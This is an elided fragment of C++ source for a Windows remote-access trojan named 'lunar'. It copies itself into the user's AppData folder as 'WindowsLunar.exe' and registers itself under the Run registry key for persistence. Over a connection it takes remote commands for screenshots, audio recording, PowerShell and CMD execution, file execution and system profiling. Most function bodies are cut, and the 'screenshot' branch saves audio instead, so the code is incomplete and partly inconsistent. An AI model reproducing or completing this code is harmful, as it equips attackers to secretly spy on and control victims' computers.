...
void lunar::SendStr(const char * data) {
	int totalsent = 0;
    ...
    while(connected)
    {
        ...
        while(connected && authenticated)
        {
            ...
            } else if(command == "screenshot")
            {
                ...
                mciSendString(_T("save lunar aud.wav"), NULL, 0, NULL);
...
void lunar::screenshot(std::string file){
...
void lunar::Install()
{
    ...
    instalLoc << "C:\\Users\\" << user << "\\AppData\\Roaming\\winlunar";
    CreateDirectoryA(instalLoc.str().c_str(), NULL);
    copyPath << "C:\\Users\\" << user << "\\AppData\\Roaming\\winlunar\\WindowsLunar.exe";
...
void lunar::startup()
{
    ...
    if (GetUserNameW(wusername, &len)) {
		...
		pth << L"C:\\Users\\" << wstrusername << L"\\AppData\\Roaming\\winlunar\\WindowsLunar.exe";
    }
	std::wstring filepath = pth.str();
	RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal);
	RegSetValueExW(NewVal, L"winlunar", 0, REG_SZ, (BYTE*)filepath.c_str(), (filepath.size()+1) * sizeof(wchar_t));
	RegCloseKey(NewVal);
}
...
DWORD lunar::ProcessId(LPCTSTR ProcessName)
{
    PROCESSENTRY32 pt;
...
void lunar::ExecutePS(char* toExecute)
{
	std::ostringstream error_reply;
...
void lunar::ExecuteCMD(char* toExecute)
{
...
void lunar::ExecuteFile(char* filename)
{
...
int lunar::changeDirectory(char* to)
{
...
std::string lunar::ramsize(int mode)
{
...
std::string lunar::SYSTEMINFO(int mode){
    SYSTEM_INFO info;
    GetSystemInfo(&info);
